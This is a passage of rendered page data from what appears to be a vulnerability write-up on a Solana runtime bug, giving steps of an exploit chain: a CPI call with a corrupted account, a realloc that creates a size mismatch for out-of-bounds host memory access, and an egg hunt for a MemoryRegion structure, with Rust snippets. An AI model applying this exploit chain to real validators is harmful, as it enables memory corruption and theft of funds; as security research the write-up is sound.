token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\"]}],[\"$\",\"span\",\"code-segement93\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Rc\"]}],[\"$\",\"span\",\"code-segement94\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\"]}],[\"$\",\"span\",\"code-segement95\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"RefCell\"]}],[\"$\",\"span\",\"code-segement96\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\"]}],[\"$\",\"span\",\"code-segement97\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\"]}],[\"$\",\"span\",\"code-segement98\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"mut\"]}],[\"$\",\"span\",\"code-segement99\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement100\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"[\"]}],[\"$\",\"span\",\"code-segement101\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"u8\"]}],[\"$\",\"span\",\"code-segement102\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"]\"]}],[\"$\",\"span\",\"code-segement103\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003e\u003e\"]}],[\"$\",\"span\",\"code-segement104\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003e\"]}],[\"$\",\"span\",\"code-segement105\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement106\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement107\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement108\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--6\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[6]}],[\"$\",\"span\",\"code-segement110\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segement111\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement112\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\";\"]}],[\"$\",\"span\",\"code-segement113\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--7\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[7]}],[\"$\",\"span\",\"code-segement115\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\"]}],[\"$\",\"span\",\"code-segement116\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"}\"]}]]]}]}]}],\"\\n\",[\"$\",\"h4\",\"h4-13\",{\"className\":\"text-2xl py-4 border-b border-white/10\",\"children\":\"Step 3: Vulnerability Trigger via CPI\"}],\"\\n\",[\"$\",\"p\",\"p-119\",{\"className\":\"text-xl py-3 text-pretty sm:text-justify\",\"children\":[\"Now we trigger the flawed \",[\"$\",\"code\",\"code-0\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"update_caller_account()\"}],\" logic by initiating a CPI call doing nothing but with the corrupted \",[\"$\",\"strong\",\"strong-0\",{\"children\":\"SWAP\"}],\" account.\"]}],\"\\n\",[\"$\",\"pre\",\"pre-17\",{\"children\":[\"$\",\"div\",\"code-0\",{\"className\":\"rounded-sm\",\"style\":{\"color\":\"#ccc\",\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"1em\",\"textAlign\":\"left\",\"whiteSpace\":\"pre\",\"wordSpacing\":\"normal\",\"wordBreak\":\"normal\",\"wordWrap\":\"normal\",\"lineHeight\":\"1.5\",\"MozTabSize\":\"4\",\"OTabSize\":\"4\",\"tabSize\":\"4\",\"WebkitHyphens\":\"none\",\"MozHyphens\":\"none\",\"msHyphens\":\"none\",\"hyphens\":\"none\",\"padding\":\"1em\",\"margin\":\".5em 0\",\"overflow\":\"auto\"},\"children\":[\"$\",\"code\",null,{\"className\":\"language-rust\",\"style\":{\"whiteSpace\":\"pre\",\"color\":\"#ccc\",\"background\":\"none\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"1em\",\"textAlign\":\"left\",\"wordSpacing\":\"normal\",\"wordBreak\":\"normal\",\"wordWrap\":\"normal\",\"lineHeight\":\"1.5\",\"MozTabSize\":\"4\",\"OTabSize\":\"4\",\"tabSize\":\"4\",\"WebkitHyphens\":\"none\",\"MozHyphens\":\"none\",\"msHyphens\":\"none\",\"hyphens\":\"none\"},\"children\":[false,[[\"$\",\"span\",\"line-number--1\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[1]}],[\"$\",\"span\",\"code-segement1\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"invoke_signed\"]}],[\"$\",\"span\",\"code-segement2\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement3\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--2\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[2]}],[\"$\",\"span\",\"code-segement5\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segement6\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\"]}],[\"$\",\"span\",\"code-segement7\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Instruction\"]}],[\"$\",\"span\",\"code-segement8\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"::\"]}],[\"$\",\"span\",\"code-segement9\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"new_with_bincode\"]}],[\"$\",\"span\",\"code-segement10\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement11\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--3\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[3]}],[\"$\",\"span\",\"code-segement13\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}],[\"$\",\"span\",\"code-segement14\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"*\"]}],[\"$\",\"span\",\"code-segement15\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"program_id\"]}],[\"$\",\"span\",\"code-segement16\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement17\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--4\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[4]}],[\"$\",\"span\",\"code-segement19\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}],[\"$\",\"span\",\"code-segement20\",{\"className\":\"token token\",\"style\":{\"color\":\"#7ec699\"},\"children\":[\"b\\\"\\\"\"]}],[\"$\",\"span\",\"code-segement21\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement22\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--5\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[5]}],[\"$\",\"span\",\"code-segement24\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}],[\"$\",\"span\",\"code-segement25\",{\"className\":\"token token macro\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"vec!\"]}],[\"$\",\"span\",\"code-segement26\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"[\"]}],[\"$\",\"span\",\"code-segement27\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"AccountMeta\"]}],[\"$\",\"span\",\"code-segement28\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"::\"]}],[\"$\",\"span\",\"code-segement29\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"new\"]}],[\"$\",\"span\",\"code-segement30\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement31\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"accounts\"]}],[\"$\",\"span\",\"code-segement32\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"[\"]}],[\"$\",\"span\",\"code-segement33\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"swap_idx\"]}],[\"$\",\"span\",\"code-segement34\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"]\"]}],[\"$\",\"span\",\"code-segement35\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}],[\"$\",\"span\",\"code-segement36\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"key\"]}],[\"$\",\"span\",\"code-segement37\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}],[\"$\",\"span\",\"code-segement38\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"clone\"]}],[\"$\",\"span\",\"code-segement39\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement40\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement41\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement42\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement43\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"false\"]}],[\"$\",\"span\",\"code-segement44\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement45\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"]\"]}],[\"$\",\"span\",\"code-segement46\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement47\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--6\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[6]}],[\"$\",\"span\",\"code-segement49\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segement50\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement51\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement52\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--7\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[7]}],[\"$\",\"span\",\"code-segement54\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segement55\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\"]}],[\"$\",\"span\",\"code-segement56\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"[\"]}],[\"$\",\"span\",\"code-segement57\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"accounts\"]}],[\"$\",\"span\",\"code-segement58\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"[\"]}],[\"$\",\"span\",\"code-segement59\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"swap_idx\"]}],[\"$\",\"span\",\"code-segement60\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"]\"]}],[\"$\",\"span\",\"code-segement61\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}],[\"$\",\"span\",\"code-segement62\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"clone\"]}],[\"$\",\"span\",\"code-segement63\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement64\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement65\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"]\"]}],[\"$\",\"span\",\"code-segement66\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement67\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--8\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[8]}],[\"$\",\"span\",\"code-segement69\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segement70\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\"]}],[\"$\",\"span\",\"code-segement71\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"[\"]}],[\"$\",\"span\",\"code-segement72\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"]\"]}],[\"$\",\"span\",\"code-segement73\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement74\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--9\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[9]}],[\"$\",\"span\",\"code-segement76\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\"]}],[\"$\",\"span\",\"code-segement77\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement78\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"?\"]}],[\"$\",\"span\",\"code-segement79\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\";\"]}]]]}]}]}],\"\\n\",[\"$\",\"p\",\"p-120\",{\"className\":\"text-xl py-3 text-pretty sm:text-justify\",\"children\":[\"During this CPI call, the runtime builds a \",[\"$\",\"code\",\"code-0\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"CallerAccount\"}],\" for \",[\"$\",\"strong\",\"strong-0\",{\"children\":\"SWAP\"}],\" using the malformed \",[\"$\",\"code\",\"code-1\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"vm_data_addr\"}],\". Later when CPI returns, it starts the \",[\"$\",\"code\",\"code-2\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"MemoryRegion\"}],\" update process, but instead of finding \",[\"$\",\"strong\",\"strong-1\",{\"children\":\"SWAP\"}],\"'s \",[\"$\",\"code\",\"code-3\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"MemoryRegion\"}],\", it locates \",[\"$\",\"strong\",\"strong-2\",{\"children\":\"LEVERAGE\"}],\"'s \",[\"$\",\"code\",\"code-4\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"MemoryRegion\"}],\" and updates \",[\"$\",\"strong\",\"strong-3\",{\"children\":\"LEVERAGE\"}],\"'s \",[\"$\",\"code\",\"code-5\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"MemoryRegion.host_addr\"}],\" to point to \",[\"$\",\"strong\",\"strong-4\",{\"children\":\"SWAP\"}],\"'s buffer.\"]}],\"\\n\",[\"$\",\"h4\",\"h4-14\",{\"className\":\"text-2xl py-4 border-b border-white/10\",\"children\":\"Step 4: Size Mismatch to OOB\"}],\"\\n\",[\"$\",\"p\",\"p-121\",{\"className\":\"text-xl py-3 text-pretty sm:text-justify\",\"children\":[\"Next, we expand \",[\"$\",\"strong\",\"strong-0\",{\"children\":\"LEVERAGE\"}],\" to create the size mismatch.\"]}],\"\\n\",[\"$\",\"pre\",\"pre-18\",{\"children\":[\"$\",\"div\",\"code-0\",{\"className\":\"rounded-sm\",\"style\":{\"color\":\"#ccc\",\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"1em\",\"textAlign\":\"left\",\"whiteSpace\":\"pre\",\"wordSpacing\":\"normal\",\"wordBreak\":\"normal\",\"wordWrap\":\"normal\",\"lineHeight\":\"1.5\",\"MozTabSize\":\"4\",\"OTabSize\":\"4\",\"tabSize\":\"4\",\"WebkitHyphens\":\"none\",\"MozHyphens\":\"none\",\"msHyphens\":\"none\",\"hyphens\":\"none\",\"padding\":\"1em\",\"margin\":\".5em 0\",\"overflow\":\"auto\"},\"children\":[\"$\",\"code\",null,{\"className\":\"language-rust\",\"style\":{\"whiteSpace\":\"pre\",\"color\":\"#ccc\",\"background\":\"none\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"1em\",\"textAlign\":\"left\",\"wordSpacing\":\"normal\",\"wordBreak\":\"normal\",\"wordWrap\":\"normal\",\"lineHeight\":\"1.5\",\"MozTabSize\":\"4\",\"OTabSize\":\"4\",\"tabSize\":\"4\",\"WebkitHyphens\":\"none\",\"MozHyphens\":\"none\",\"msHyphens\":\"none\",\"hyphens\":\"none\"},\"children\":[false,[[\"$\",\"span\",\"line-number--1\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[1]}],[\"$\",\"span\",\"code-segement1\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// Resize LEVERAGE back to a larger size for memory scanning\"]}],[\"$\",\"span\",\"code-segement2\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--2\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[2]}],[\"$\",\"span\",\"code-segement4\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"accounts\"]}],[\"$\",\"span\",\"code-segement5\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"[\"]}],[\"$\",\"span\",\"code-segement6\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"leverage_idx\"]}],[\"$\",\"span\",\"code-segement7\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"]\"]}],[\"$\",\"span\",\"code-segement8\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}],[\"$\",\"span\",\"code-segement9\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"realloc\"]}],[\"$\",\"span\",\"code-segement10\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement11\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"0xa00000\"]}],[\"$\",\"span\",\"code-segement12\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement13\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement14\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"false\"]}],[\"$\",\"span\",\"code-segement15\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement16\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"?\"]}],[\"$\",\"span\",\"code-segement17\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\";\"]}]]]}]}]}],\"\\n\",[\"$\",\"p\",\"p-122\",{\"className\":\"text-xl py-3 text-pretty sm:text-justify\",\"children\":[\"So when we access \",[\"$\",\"strong\",\"strong-0\",{\"children\":\"LEVERAGE\"}],\" beyond \",[\"$\",\"strong\",\"strong-1\",{\"children\":\"SWAP\"}],\"'s buffer size, we get out-of-bounds access to host memory.\"]}],\"\\n\",[\"$\",\"h4\",\"h4-15\",{\"className\":\"text-2xl py-4 border-b border-white/10\",\"children\":[\"Step 5: Egg Hunting for \",[\"$\",\"code\",\"code-0\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"MemoryRegion\"}]]}],\"\\n\",[\"$\",\"p\",\"p-123\",{\"className\":\"text-xl py-3 text-pretty sm:text-justify\",\"children\":[\"With the out-of-bounds read/write, we can now hunt for the \",[\"$\",\"strong\",\"strong-0\",{\"children\":\"POINTER\"}],\" account's \",[\"$\",\"code\",\"code-0\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"MemoryRegion\"}],\" structure in host memory.\"]}],\"\\n\",[\"$\",\"pre\",\"pre-19\",{\"children\":[\"$\",\"div\",\"code-0\",{\"className\":\"rounded-sm\",\"style\":{\"color\":\"#ccc\",\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"1em\",\"textAlign\":\"left\",\"whiteSpace\":\"pre\",\"wordSpacing\":\"normal\",\"wordBreak\":\"normal\",\"wordWrap\":\"normal\",\"lineHeight\":\"1.5\",\"MozTabSize\":\"4\",\"OTabSize\":\"4\",\"tabSize\":\"4\",\"WebkitHyphens\":\"none\",\"MozHyphens\":\"none\",\"msHyphens\":\"none\",\"hyphens\":\"none\",\"padding\":\"1em\",\"margin\":\".5em 0\",\"overflow\":\"auto\"},\"children\":[\"$\",\"code\",null,{\"className\":\"language-rust\",\"style\":{\"whiteSpace\":\"pre\",\"color\":\"#ccc\",\"background\":\"none\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"1em\",\"textAlign\":\"left\",\"wordSpacing\":\"normal\",\"wordBreak\":\"normal\",\"wordWrap\":\"normal\",\"lineHeight\":\"1.5\",\"MozTabSize\":\"4\",\"OTabSize\":\"4\",\"tabSize\":\"4\",\"WebkitHyphens\":\"none\",\"MozHyphens\":\"none\",\"msHyphens\":\"none\",\"hyphens\":\"none\"},\"children\":[false,[[\"$\",\"span\",\"line-number--1\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[1]}],[\"$\",\"span\",\"code-segement1\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"let\"]}],[\"$\",\"span\",\"code-segement2\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" leverage_data \"]}],[\"$\",\"span\",\"code-segement3\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"=\"]}],[\"$\",\"span\",\"code-segement4\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" accounts\"]}],[\"$\",\"span\",\"code-segement5\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"[\"]}],[\"$\",\"span\",\"code-segement6\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"leverage_idx\"]}],[\"$\",\"span\",\"code-segement7\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"]\"]}],[\"$\",\"span\",\"code-segement8\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}],[\"$\",\"span\",\"code-segement9\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"data\"]}],[\"$\",\"span\",\"code-segement10\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}],[\"$\",\"span\",\"code-segement11\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"borrow_mut\"]}],[\"$\",\"span\",\"code-segement12\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement13\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement14\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\";\"]}],[\"$\",\"span\",\"code-segement15\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--2\",{\"className\":\"linenumber 